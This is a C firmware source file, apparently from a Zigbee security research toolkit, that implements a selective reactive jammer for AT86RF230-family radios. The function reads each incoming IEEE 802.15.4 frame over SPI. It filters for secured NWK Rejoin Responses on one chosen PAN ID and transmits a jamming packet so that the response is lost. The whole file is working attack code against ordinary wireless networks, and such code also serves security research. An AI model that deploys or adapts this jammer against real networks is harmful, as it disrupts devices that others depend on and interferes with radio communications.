/*
 * fw/attacks/attack_05.c - Attack function with ID 05
 *
 * Written 2020 by Dimitrios-Georgios Akestoridis
 * Copyright 2020 Dimitrios-Georgios Akestoridis
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 */

#include <stdbool.h>
#include <stdint.h>

#define F_CPU 8000000UL
#include <util/delay.h>

#include "at86rf230.h"
#include "spi.h"
#include "board.h"
#include "attack.h"


/* Jam only Rejoin Responses of a specified network */
bool attack(void)
{
	uint8_t rx_byte = 0;
	uint8_t phy_len = 0;
	uint8_t mac_src_0 = 0;
	uint8_t mac_src_1 = 0;
	uint8_t nwk_src_0 = 0;
	uint8_t nwk_src_1 = 0;
	uint8_t nwk_radius = 0;
	uint8_t nwk_cmd_len = 0;
	uint8_t expected_bytes = 0;
	uint8_t jam_len = 0;

	/* Read the received packet as soon as possible */
	spi_begin();
	spi_io(AT86RF230_BUF_READ);

	/* Check the length of the received packet */
	phy_len = spi_recv();
	if ((phy_len < 5) || (phy_len & 0x80)) {
		/* Ignore packets with invalid length */
		spi_end();
		return 1;
	}

	/* Check the 8 least-significant bits of the MAC Frame Control */
	_delay_us(32);
	rx_byte = spi_recv();
	if ((rx_byte & 0x03) != 0x01) {
		/* Ignore packets that are not MAC Data packets */
		spi_end();
		return 1;
	} else if (rx_byte & 0x08) {
		/* Ignore packets with MAC Security enabled */
		spi_end();
		return 1;
	} else if (!(rx_byte & 0x40)) {
		/* Ignore packets that do not compress the PAN ID */
		spi_end();
		return 1;
	}

	/* Check the 8 most-significant bits of the MAC Frame Control */
	_delay_us(32);
	rx_byte = spi_recv();
	if (rx_byte & 0x30) {
		/*
		 * Ignore packets that do not use the
		 * IEEE 802.15.4-2003 frame version
		 */
		spi_end();
		return 1;
	} else if ((rx_byte & 0x0c) != 0x08) {
		/*
		 * Ignore packets that do not use a short address
		 * for the destination node on the MAC layer
		 */
		spi_end();
		return 1;
	} else if ((rx_byte & 0xc0) != 0x80) {
		/*
		 * Ignore packets that do not use a short address
		 * for the source node on the MAC layer
		 */
		spi_end();
		return 1;
	}

	/* Ignore the MAC sequence number */
	_delay_us(32);
	spi_recv();

	/* Check the destination PAN ID */
	_delay_us(32);
	if (spi_recv() != (PANID & 0xff)) {
		/*
		 * Ignore packets that are
		 * destined for a different network
		 */
		spi_end();
		return 1;
	}
	_delay_us(32);
	if (spi_recv() != ((PANID >> 8) & 0xff)) {
		/*
		 * Ignore packets that are
		 * destined for a different network
		 */
		spi_end();
		return 1;
	}

	/* Ignore the MAC destination address */
	_delay_us(32);
	spi_recv();
	_delay_us(32);
	spi_recv();

	/* Store the MAC source address */
	_delay_us(32);
	mac_src_0 = spi_recv();
	_delay_us(32);
	mac_src_1 = spi_recv();

	/* Check the 8 least-significant bits of the NWK Frame Control */
	_delay_us(32);
	if ((spi_recv() & 0x03) != 0x01) {
		/* Ignore packets that are not NWK Command packets */
		spi_end();
		return 1;
	}

	/* Check the 8 most-significant bits of the NWK Frame Control */
	_delay_us(32);
	rx_byte = spi_recv();
	if (!(rx_byte & 0x02)) {
		/* Ignore packets with NWK Security disabled */
		spi_end();
		return 1;
	} else if (rx_byte & 0x04) {
		/* Ignore source-routed packets */
		spi_end();
		return 1;
	}

	/* Compute the expected number of bytes */
	if (rx_byte & 0x08) {
		/*
		 * The extended address of the NWK destination
		 * is included in the header fields
		 */
		expected_bytes += 8;
	}
	if (rx_byte & 0x10) {
		/*
		 * The extended address of the NWK source
		 * is included in the header fields
		 */
		expected_bytes += 8;
	}
	if (rx_byte & 0x01) {
		/*
		 * The multicast control field
		 * is included in the header fields
		 */
		expected_bytes += 1;
	}

	/* Ignore the NWK destination address */
	_delay_us(32);
	spi_recv();
	_delay_us(32);
	spi_recv();

	/* Store the NWK source address */
	_delay_us(32);
	nwk_src_0 = spi_recv();
	_delay_us(32);
	nwk_src_1 = spi_recv();

	/* Store the NWK radius */
	_delay_us(32);
	nwk_radius = spi_recv();

	/*
	 * Compute the payload length of the NWK command.
	 * The constant 38 was derived by summing the following:
	 *   17: Processed bytes
	 *    1: NWK Sequence Number
	 *   14: NWK Auxiliary Header
	 *    1: NWK Command Identifier
	 *    4: NWK Message Integrity Code
	 *    2: MAC Frame Check Sequence
	 *   -1: PHY Length
	 */
	nwk_cmd_len = phy_len - (expected_bytes + 38);

	/* Decide whether the packet should be jammed or not */
	if (nwk_cmd_len != 3 || nwk_radius != 1
	    || nwk_src_1 != mac_src_1 || nwk_src_0 != mac_src_0) {
		/* The packet is not a Rejoin Response */
		spi_end();
		return 1;
	}

	/* Stop receiving and transition into the PLL_ON state */
	spi_end();
#if defined(AT86RF231) || defined(AT86RF212)
	reg_write(REG_TRX_STATE, TRX_CMD_FORCE_PLL_ON);
#elif defined(AT86RF230)
	reg_write(REG_TRX_STATE, TRX_CMD_PLL_ON);
#else
#error "Unknown transceiver"
#endif

	/* Calculate the length of the jamming packet */
	if (phy_len > 29) {
		jam_len = phy_len - 29;
	} else {
		jam_len = 1;
	}

	/* Jam the received packet */
	spi_begin();
	spi_send(AT86RF230_BUF_WRITE);
	spi_send(jam_len);
	spi_end();

	/* Transition into the BUSY_TX state */
	slp_tr();

	/* Transition into the RX_ON state */
	change_state(TRX_CMD_RX_ON);

	return 1;
}
